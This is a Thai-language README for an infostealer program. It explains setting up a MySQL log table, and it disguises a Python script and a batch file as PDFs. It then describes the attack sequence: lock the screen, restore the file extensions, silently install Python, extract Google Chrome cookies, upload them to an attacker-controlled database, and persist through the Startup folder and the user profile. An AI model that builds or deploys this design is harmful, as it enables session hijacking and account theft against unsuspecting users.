***** นี่คือ source code ที่ยังไม่runเป็นแบบ .exe เท่านั้นจึงต้องอาศัย (click me).bat ในการทดสอบ *******

***** ตั้งค่าก่อน run program *******
--ตัวที่ผม test จะเป็น phpmyadmin 
1.ต้อง set ค่า database ก่อน ตัวอย่างเช่น
  -- สร้างฐานข้อมูลชื่อ user ถ้ายังไม่มี
	CREATE DATABASE IF NOT EXISTS user;
   -- ใช้ฐานข้อมูล user
	USE user;
   -- สร้างตาราง user_log ถ้ายังไม่มี
	CREATE TABLE IF NOT EXISTS user_log (
	id INT AUTO_INCREMENT PRIMARY KEY,
	user VARCHAR(255) NOT NULL,
	data TEXT NOT NULL,
	log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);

3. ตั้งค่า connect database ก่อน
	conn = mysql.connector.connect(host="host", user="host", password=password", database="database")

4. หากตองการ run program ต้องปลี่ยนนามสกุล file เป็น tab.py เป็น tab.pdf และ hidden.bat เป็น hidden.pdf


******หลักการทำงานของโปรแกรม******

1. อันดับแรกโปรแกรมจะทำการล็อคหน้าจอของผู้ใช้ 
2. โปรแกรมจะเปลี่ยนนามสกุลไฟล์ hidden.pdf และ tab.pdf เปลี่ยนเป็น hidden.bat และ tab.py ตามลำดับ
3. ถ้าหากว่าในเครื่องนั้นไม่ได้ติดตั้ง python เอาไว้โปรแกรมก็จะทำการลง python จากไฟล์ python installer .bat
4. จากนั้นก็จะ run ไฟล์ tab.py
5. โดย tab.py จะทำการดึงคุกกี้จาก google chrome ออกมาและทำการอัพโหลดไปที่ Database server ที่ตั้งค่าเอาไว้
6. หลังจากนั้นโปรแกรมตัวนี้จะทำการซ่อนตัวอยู่ในเครื่องของผู้ใช้โดยที่ hidden.pdf จะทำการฝังตัวเองไว้ใน Start Up และ tab.pdf จะถูก copy ไปที่ userprofile folder
